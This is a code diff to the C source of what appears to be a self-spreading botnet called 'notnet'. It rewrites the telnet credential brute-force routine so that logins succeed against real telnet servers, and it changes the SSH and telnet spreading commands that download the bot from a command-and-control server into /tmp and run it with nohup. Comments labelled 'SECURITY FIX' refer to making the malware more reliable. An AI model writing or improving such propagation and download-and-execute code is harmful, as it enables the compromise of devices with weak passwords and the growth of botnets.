@@ -344,7 +344,7 @@ int spread_ssh(notnet_bot_t *bot, const char *ip, uint16_t port) {
                  * .250s precision above, but GCC can't see through the
                  * intermediate buffer, so cap again to silence truncation. */
                 snprintf(cmd, sizeof(cmd),
-                    "wget %.500s -O /tmp/.notnet && chmod +x /tmp/.notnet && /tmp/.notnet &",
+                    "wget %.500s -O /tmp/.notnet; chmod +x /tmp/.notnet; nohup /tmp/.notnet &",
                     dl_url);
                 /* SECURITY FIX (#15): Send command over the established socket */
                 send_command(sock_fd, "ssh", cmd);
@@ -364,61 +364,160 @@ int try_login_telnet_with_timeout(const char *ip, uint16_t port, const char *use
     int sock = create_connection(ip, port, timeout_ms);
     if (sock < 0) return -1;
 
-    /* banner is not read by this function, but zero-init it for hygiene
-     * and bound the NUL after recv (CWE-457, same class as #104). */
-    char banner[256] = {0};
+    /* SECURITY FIX (#133): wait for the LOGIN PROMPT before sending the
+     * username. Real telnetd (busybox/inetutils) first sends the IAC
+     * WILL/WONT negotiation burst and WAITS for the client's response —
+     * only then does it send "login:". The old code never answered the
+     * negotiation, so the prompt never arrived and the client desynced.
+     * The emulator's lenient telnet masked this. */
+    char banner[512] = {0};
+    int blen = 0;
+    int iac_replied = 0;
     fd_set fds;
     struct timeval tv;
-    FD_ZERO(&fds);
-    FD_SET(sock, &fds);
-    tv.tv_sec = 1;
-    tv.tv_usec = 0;
-
-    if (select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
-        int n = (int)recv(sock, banner, sizeof(banner) - 1, 0);
-        if (n > 0) banner[n] = '\0';
+    long waited_ms = 0;
+    while (blen < (int)sizeof(banner) - 1 && waited_ms < 4000) {
+        FD_ZERO(&fds);
+        FD_SET(sock, &fds);
+        tv.tv_sec = 0;
+        tv.tv_usec = 200000;   /* 200ms polls */
+        int sr = select(sock + 1, &fds, NULL, NULL, &tv);
+        if (sr <= 0) {
+            waited_ms += 200;
+            continue;
+        }
+        int n = (int)recv(sock, banner + blen, sizeof(banner) - 1 - blen, 0);
+        if (n <= 0) break;
+        blen += n;
+        banner[blen] = '\0';
+        /* Answer the telnet IAC negotiation once (decline WILL/WONT,
+         * refuse DO/DONT) so the server proceeds to the login prompt. */
+        if (!iac_replied && memchr(banner, 0xff, (size_t)blen)) {
+            char reply[64];
+            int rl = 0;
+            for (int i = 0; i < blen - 2 && rl < (int)sizeof(reply) - 3; i++) {
+                if ((unsigned char)banner[i] == 0xff) {
+                    unsigned char cmd = (unsigned char)banner[i + 1];
+                    unsigned char opt = (unsigned char)banner[i + 2];
+                    if (cmd == 0xfb || cmd == 0xfc) {      /* WILL/WONT */
+                        reply[rl++] = (char)0xff;
+                        reply[rl++] = (char)0xfe;           /* DONT */
+                        reply[rl++] = (char)opt;
+                    } else if (cmd == 0xfd || cmd == 0xfe) { /* DO/DONT */
+                        reply[rl++] = (char)0xff;
+                        reply[rl++] = (char)0xfc;           /* WONT */
+                        reply[rl++] = (char)opt;
+                    }
+                    i += 2;
+                }
+            }
+            if (rl > 0) {
+                send(sock, reply, (size_t)rl, 0);
+                iac_replied = 1;
+            }
+        }
+        if (strstr(banner, "login:") || strstr(banner, "Login:") ||
+            strstr(banner, "Username") || strstr(banner, "username")) {
+            break;
+        }
     }
+    if (!(strstr(banner, "login:") || strstr(banner, "Login:") ||
+          strstr(banner, "Username") || strstr(banner, "username"))) {
+        log_info("TELNETDBG: no login prompt (got %.60s)", banner);
+        close(sock);
+        return -1;
+    }
+    log_info("TELNETDBG: prompt ok (%.50s)", banner);
 
     /* Send username */
     char cmd[512];
     snprintf(cmd, sizeof(cmd), "%s\r\n", user);
     send(sock, cmd, strlen(cmd), 0);
 
-    /* Read prompt */
+    /* Read until the password prompt */
     char resp[256];
     memset(resp, 0, sizeof(resp));
-    FD_ZERO(&fds);
-    FD_SET(sock, &fds);
-    tv.tv_sec = 2;
-    tv.tv_usec = 0;
-
-    if (select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
-        memset(resp, 0, sizeof(resp));
-        recv(sock, resp, sizeof(resp) - 1, 0);
+    int rlen = 0;
+    waited_ms = 0;
+    while (rlen < (int)sizeof(resp) - 1 && waited_ms < 4000) {
+        FD_ZERO(&fds);
+        FD_SET(sock, &fds);
+        tv.tv_sec = 0;
+        tv.tv_usec = 200000;
+        int sr = select(sock + 1, &fds, NULL, NULL, &tv);
+        if (sr <= 0) {
+            waited_ms += 200;
+            continue;
+        }
+        int n = (int)recv(sock, resp + rlen, sizeof(resp) - 1 - rlen, 0);
+        if (n <= 0) break;
+        rlen += n;
+        resp[rlen] = '\0';
+        if (strstr(resp, "assword") || strstr(resp, "password")) {
+            break;
+        }
     }
 
     /* Send password */
     snprintf(cmd, sizeof(cmd), "%s\r\n", pass);
     send(sock, cmd, strlen(cmd), 0);
+    log_info("TELNETDBG: sent pass, pwprompt=%.40s", resp);
 
-    /* Read response */
-    FD_ZERO(&fds);
-    FD_SET(sock, &fds);
-    tv.tv_sec = 2;
-    tv.tv_usec = 0;
-
+    /* Read response — accumulate until a shell marker appears. Real
+     * telnetd sends a LONG MOTD (the Debian copyright notice exceeds 256
+     * bytes), so the buffer is a rolling tail: each fresh chunk is
+     * checked for markers and the stored window slides. Confirmed
+     * failure markers break out fast so the pool isn't slowed 8x. */
     int success = 0;
-    if (select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
-        memset(resp, 0, sizeof(resp));
-        recv(sock, resp, sizeof(resp) - 1, 0);
-        resp[sizeof(resp) - 1] = '\0';
-        if (strstr(resp, "$") || strstr(resp, "#") || strstr(resp, "OK")) {
-            success = 1;
+    int rlen2 = 0;
+    waited_ms = 0;
+    {
+        char chunk[128];
+        while (waited_ms < 8000) {
+            FD_ZERO(&fds);
+            FD_SET(sock, &fds);
+            tv.tv_sec = 0;
+            tv.tv_usec = 200000;
+            int sr = select(sock + 1, &fds, NULL, NULL, &tv);
+            if (sr <= 0) {
+                waited_ms += 200;
+                continue;
+            }
+            int n = (int)recv(sock, chunk, sizeof(chunk) - 1, 0);
+            if (n <= 0) break;
+            chunk[n] = '\0';
+            if (memchr(chunk, '$', (size_t)n) || memchr(chunk, '#', (size_t)n) ||
+                strstr(chunk, "OK")) {
+                success = 1;
+                break;
+            }
+            if (strstr(chunk, "incorrect") || strstr(chunk, "denied") ||
+                strstr(chunk, "Invalid") || strstr(chunk, "invalid")) {
+                break;
+            }
+            if (rlen2 + n >= (int)sizeof(resp) - 1) {
+                /* roll the window: keep the last 96 bytes */
+                memmove(resp, resp + 96, 96);
+                rlen2 = 96;
+            }
+            memcpy(resp + rlen2, chunk, (size_t)n);
+            rlen2 += n;
+            resp[rlen2] = '\0';
         }
     }
 
     /* SECURITY FIX (#15): Return socket fd on success instead of closing */
     if (success) return sock;
+    {
+        char esc[160] = {0};
+        int ei = 0;
+        for (int i = 0; resp[i] && ei < 155; i++) {
+            if (resp[i] == '\r') { esc[ei++] = '\\'; esc[ei++] = 'r'; }
+            else if (resp[i] == '\n') { esc[ei++] = '\\'; esc[ei++] = 'n'; }
+            else esc[ei++] = resp[i];
+        }
+        log_info("TELNETDBG: %s:%s failed (resp=%s)", user, pass, esc);
+    }
     close(sock);
     return -1;
 }
@@ -519,7 +618,7 @@ int spread_telnet(notnet_bot_t *bot, const char *ip, uint16_t port) {
                 
                 char cmd[512];
                 snprintf(cmd, sizeof(cmd),
-                    "wget http://%s:%d/bot/notnet -O /tmp/.notnet && chmod +x /tmp/.notnet && /tmp/.notnet &",
+                    "wget http://%s:%d/bot/notnet -O /tmp/.notnet; chmod +x /tmp/.notnet; nohup /tmp/.notnet &",
                     bot->c2_http.server, PAYLOAD_DL_PORT);
                 /* SECURITY FIX (#15): Send command over the established socket */
                 send_command(sock_fd, "telnet", cmd);
